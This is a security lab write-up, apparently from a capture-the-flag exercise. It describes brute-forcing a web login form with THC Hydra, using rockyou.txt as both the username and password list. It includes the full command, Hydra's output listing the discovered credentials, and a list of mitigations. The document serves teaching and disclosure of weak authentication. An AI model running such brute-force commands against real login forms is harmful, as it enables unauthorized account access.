## 📌 Breach Name:
## HTTP-BruteForceAllCreds

## 📖 Description:
This breach uses THC Hydra to brute-force both usernames and passwords on the web application’s login form. By supplying the same rockyou.txt list as both the username and password source—and due to the absence of brute-force protections—multiple valid credentials were discovered.

## 📌 Vulnerability Type:
    Weak Authentication Controls

    No Rate Limiting or Account Lockout

    No CAPTCHA or Anti-Automation

## 📖 Exploitation Steps:
Prepared rockyou.txt containing common words.

Run Hydra:

        hydra \
        -L /media/atabiti/atabiti_ssd/rockyou.txt \
        -P /media/atabiti/atabiti_ssd/rockyou.txt \
        10.11.100.193 http-get-form \
        "/:page=signin&username=^USER^&password=^PASS^&Login=Login:Wrong"

### Hydra returned multiple valid credentials:


[80][http-get-form] host: 10.11.100.193   login: monkey   password: shadow
[80][http-get-form] host: 10.11.100.193   login: 123456   password: shadow
[80][http-get-form] host: 10.11.100.193   login: 12345   password: shadow
[80][http-get-form] host: 10.11.100.193   login: 123456789   password: shadow
[80][http-get-form] host: 10.11.100.193   login: password   password: shadow
[80][http-get-form] host: 10.11.100.193   login: iloveyou   password: shadow
[80][http-get-form] host: 10.11.100.193   login: princess   password: shadow
[80][http-get-form] host: 10.11.100.193   login: 1234567   password: shadow
[80][http-get-form] host: 10.11.100.193   login: rockyou   password: shadow
[80][http-get-form] host: 10.11.100.193   login: 12345678   password: shadow
[80][http-get-form] host: 10.11.100.193   login: abc123   password: shadow
[80][http-get-form] host: 10.11.100.193   login: nicole   password: shadow
[80][http-get-form] host: 10.11.100.193   login: daniel   password: shadow
[80][http-get-form] host: 10.11.100.193   login: babygirl   password: shadow
[80][http-get-form] host: 10.11.100.193   login: lovely   password: shadow
[80][http-get-form] host: 10.11.100.193   login: jessica   password: shadow
[80][http-get-form] host: 10.11.100.193   login: 654321   password: shadow
[80][http-get-form] host: 10.11.100.193   login: michael   password: shadow
[80][http-get-form] host: 10.11.100.193   login: ashley   password: shadow
[80][http-get-form] host: 10.11.100.193   login: qwerty   password: shadow
[80][http-get-form] host: 10.11.100.193   login: 111111   password: shadow
[80][http-get-form] host: 10.11.100.193   login: iloveu   password: shadow
[80][http-get-form] host: 10.11.100.193   login: 000000   password: shadow
[80][http-get-form] host: 10.11.100.193   login: michelle   password: shadow
[80][http-get-form] host: 10.11.100.193   login: tigger   password: shadow
[80][http-get-form] host: 10.11.100.193   login: sunshine   password: shadow
[80][http-get-form] host: 10.11.100.193   login: chocolate   password: shadow
[80][http-get-form] host: 10.11.100.193   login: password1   password: shadow
[80][http-get-form] host: 10.11.100.193   login: soccer   password: shadow
[80][http-get-form] host: 10.11.100.193   login: anthony   password: shadow

...

## 🛡️ Solution / Mitigation:
    Implement rate limiting and account lockout after repeated failures.

    Add CAPTCHA or MFA to the login form.

    Monitor and alert on multiple failed login attempts.

    Enforce strong, unique passwords per account.